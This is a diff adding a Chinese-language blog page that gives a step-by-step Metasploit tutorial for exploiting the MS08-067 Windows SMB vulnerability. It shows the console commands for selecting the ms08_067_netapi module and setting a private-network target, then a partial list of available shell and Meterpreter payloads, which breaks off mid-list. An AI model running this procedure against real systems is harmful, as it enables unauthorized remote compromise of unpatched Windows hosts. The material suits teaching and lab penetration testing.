@@ -1,0 +1,1758 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="关于08_067漏洞的利用  1.打开终端 2.打开msf控制台 msfconsole  有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了  3.查找漏洞利用模板 msf &amp;gt; search 08_067  Matching Modules ================   Name">
+<meta name="keywords" content="Metasploit,MS08-067,meterpreter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit关于08_067漏洞的利用">
+<meta property="og:url" content="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit关于08-067漏洞的利用/index.html">
+<meta property="og:site_name" content="JD1412">
+<meta property="og:description" content="关于08_067漏洞的利用  1.打开终端 2.打开msf控制台 msfconsole  有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了  3.查找漏洞利用模板 msf &amp;gt; search 08_067  Matching Modules ================   Name">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-13T22:09:08.026Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit关于08_067漏洞的利用">
+<meta name="twitter:description" content="关于08_067漏洞的利用  1.打开终端 2.打开msf控制台 msfconsole  有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了  3.查找漏洞利用模板 msf &amp;gt; search 08_067  Matching Modules ================   Name">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="JD1412" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit关于08-067漏洞的利用/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Metasploit关于08_067漏洞的利用 | JD1412</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/JD1412/JD1412.github.io.github" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">JD1412</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">黑色的眼睛</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-schedule">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>日程表</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益 404</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit关于08-067漏洞的利用/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Healer">
+      <meta itemprop="description" content="桃李不言，下自成蹊">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JD1412">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploit关于08_067漏洞的利用
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-14 06:08:08 / 修改时间：06:09:08" itemprop="dateCreated datePublished" datetime="2019-01-14T06:08:08+08:00">2019-01-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h1 id="关于08-067漏洞的利用"><a href="#关于08-067漏洞的利用" class="headerlink" title="关于08_067漏洞的利用"></a>关于08_067漏洞的利用</h1></blockquote>
+<ul>
+<li>1.打开终端</li>
+<li><p>2.打开msf控制台</p>
+<pre><code>msfconsole
+</code></pre><p> 有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了</p>
+</li>
+<li><p>3.查找漏洞利用模板</p>
+<pre><code>msf &gt; search 08_067
+
+Matching Modules
+================
+
+ Name                                 Disclosure Date  Rank   Description
+ ----                                 ---------------  ----   -----------
+ exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+</code></pre></li>
+<li><p>4.使用模板</p>
+<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
+</code></pre><p> 之后msf的输入变成了这样</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt;
+</code></pre></li>
+<li><p>5.查看需要配置那些信息</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; show options
+</code></pre></li>
+</ul>
+<pre><code>Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+</code></pre><ul>
+<li><p>6.设置目标电脑IP</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.43.176
+
+RHOST =&gt; 192.168.43.176
+</code></pre><h3 id="再次查看配置信息"><a href="#再次查看配置信息" class="headerlink" title="再次查看配置信息"></a>再次查看配置信息</h3><pre><code>msf exploit(ms08_067_netapi) &gt; show options
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.43.176   yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+</code></pre></li>
+</ul>
+<pre><code>Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+</code></pre><ul>
+<li><p>7.查看载荷</p>
+<pre><code>msf exploit(ms08_067_netapi) &gt; show payloads
+
+Compatible Payloads
+===================
+
+ Name                                                Disclosure Date  Rank    Description
+  ----                                                ---------------  ----    -----------
+  generic/custom                                                       normal  Custom Payload
+  generic/debug_trap                                                   normal  Generic x86 Debug Trap
+  generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
+  generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
+  generic/tight_loop                                                   normal  Generic x86 Tight Loop
+  windows/adduser                                                      normal  Windows Execute net user /ADD
+  windows/dllinject/bind_hidden_ipknock_tcp                            normal  Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+  windows/dllinject/bind_hidden_tcp                                    normal  Reflective DLL Injection, Hidden Bind TCP Stager
+  windows/dllinject/bind_ipv6_tcp                                      normal  Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+  windows/dllinject/bind_ipv6_tcp_uuid                                 normal  Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/dllinject/bind_nonx_tcp                                      normal  Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+  windows/dllinject/bind_tcp                                           normal  Reflective DLL Injection, Bind TCP Stager (Windows x86)
+  windows/dllinject/bind_tcp_rc4                                       normal  Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption)
+  windows/dllinject/bind_tcp_uuid                                      normal  Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+  windows/dllinject/reverse_hop_http                                   normal  Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager
+  windows/dllinject/reverse_http                                       normal  Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+  windows/dllinject/reverse_ipv6_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (IPv6)
+  windows/dllinject/reverse_nonx_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+  windows/dllinject/reverse_ord_tcp                                    normal  Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/dllinject/reverse_tcp                                        normal  Reflective DLL Injection, Reverse TCP Stager
+  windows/dllinject/reverse_tcp_allports                               normal  Reflective DLL Injection, Reverse All-Port TCP Stager
+  windows/dllinject/reverse_tcp_dns                                    normal  Reflective DLL Injection, Reverse TCP Stager (DNS)
+  windows/dllinject/reverse_tcp_rc4                                    normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption)
+  windows/dllinject/reverse_tcp_uuid                                   normal  Reflective DLL Injection, Reverse TCP Stager with UUID Support
+  windows/dllinject/reverse_winhttp                                    normal  Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+  windows/dns_txt_query_exec                                           normal  DNS TXT Record Payload Download and Execution
+  windows/exec                                                         normal  Windows Execute Command
+  windows/format_all_drives                                            manual  Windows Drive Formatter
+  windows/loadlibrary                                                  normal  Windows LoadLibrary Path
+  windows/messagebox                                                   normal  Windows MessageBox
+  windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+  windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+  windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+  windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+  windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+  windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
+  windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+  windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+  windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+  windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+  windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
+  windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+  windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+  windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+  windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+  windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+  windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
+  windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+  windows/meterpreter/reverse_winhttp                                  normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+  windows/meterpreter/reverse_winhttps                                 normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+  windows/metsvc_bind_tcp                                              normal  Windows Meterpreter Service, Bind TCP
+  windows/metsvc_reverse_tcp                                           normal  Windows Meterpreter Service, Reverse TCP Inline
+  windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+  windows/patchupdllinject/bind_hidden_tcp                             normal  Windows Inject DLL, Hidden Bind TCP Stager
+  windows/patchupdllinject/bind_ipv6_tcp                               normal  Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+  windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/patchupdllinject/bind_nonx_tcp                               normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+  windows/patchupdllinject/bind_tcp                                    normal  Windows Inject DLL, Bind TCP Stager (Windows x86)
+  windows/patchupdllinject/bind_tcp_rc4                                normal  Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption)
+  windows/patchupdllinject/bind_tcp_uuid                               normal  Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+  windows/patchupdllinject/reverse_ipv6_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
+  windows/patchupdllinject/reverse_nonx_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+  windows/patchupdllinject/reverse_ord_tcp                             normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/patchupdllinject/reverse_tcp                                 normal  Windows Inject DLL, Reverse TCP Stager
+  windows/patchupdllinject/reverse_tcp_allports                        normal  Windows Inject DLL, Reverse All-Port TCP Stager
+  windows/patchupdllinject/reverse_tcp_dns                             normal  Windows Inject DLL, Reverse TCP Stager (DNS)
+  windows/patchupdllinject/reverse_tcp_rc4                             normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption)
+  windows/patchupdllinject/reverse_tcp_uuid                            normal  Windows Inject DLL, Reverse TCP Stager with UUID Support
+  windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+  windows/patchupmeterpreter/bind_hidden_tcp                           normal  Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+  windows/patchupmeterpreter/bind_ipv6_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+  windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/patchupmeterpreter/bind_nonx_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+  windows/patchupmeterpreter/bind_tcp                                  normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+  windows/patchupmeterpreter/bind_tcp_rc4                              normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption)
+  windows/patchupmeterpreter/bind_tcp_uuid                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+  windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+  windows/patchupmeterpreter/reverse_nonx_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+  windows/patchupmeterpreter/reverse_ord_tcp                           normal  Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/patchupmeterpreter/reverse_tcp                               normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+  windows/patchupmeterpreter/reverse_tcp_allports                      normal  Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+  windows/patchupmeterpreter/reverse_tcp_dns                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+  windows/patchupmeterpreter/reverse_tcp_rc4                           normal  Windows   Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption)
+  windows/patchupmeterpreter/reverse_tcp_uuid                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+  windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
+  windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
+  windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+  windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
+  windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
+  windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption)
+  windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+  windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
+  windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+  windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
+  windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
+  windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)
+  windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption)
+  windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
+  windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
+  windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
+  windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
+  windows/speak_pwned                                                  normal  Windows Speech API - Say &quot;You Got Pwned!&quot;
+  windows/upexec/bind_hidden_ipknock_tcp                               normal  Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+  windows/upexec/bind_hidden_tcp                                       normal  Windows Upload/Execute, Hidden Bind TCP Stager
+  windows/upexec/bind_ipv6_tcp                                         normal  Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+  windows/upexec/bind_ipv6_tcp_uuid                                    normal  Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   windows/upexec/bind_nonx_tcp                                         normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+  windows/upexec/bind_tcp                                              normal  Windows Upload/Execute, Bind TCP Stager (Windows x86)
+  windows/upexec/bind_tcp_rc4                                          normal  Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption)
+  windows/upexec/bind_tcp_uuid                                         normal  Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+  windows/upexec/reverse_ipv6_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
+  windows/upexec/reverse_nonx_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+  windows/upexec/reverse_ord_tcp                                       normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/upexec/reverse_tcp                                           normal  Windows Upload/Execute, Reverse TCP Stager
+  windows/upexec/reverse_tcp_allports                                  normal  Windows Upload/Execute, Reverse All-Port TCP Stager
+  windows/upexec/reverse_tcp_dns                                       normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
+  windows/upexec/reverse_tcp_rc4                                       normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption)
+  windows/upexec/reverse_tcp_uuid                                      normal  Windows Upload/Execute, Reverse TCP Stager with UUID Support
+  windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+  windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager
+  windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+  windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+  windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+  windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+  windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
+  windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+  windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
+  windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+  windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+  windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+  windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+  windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager
+  windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
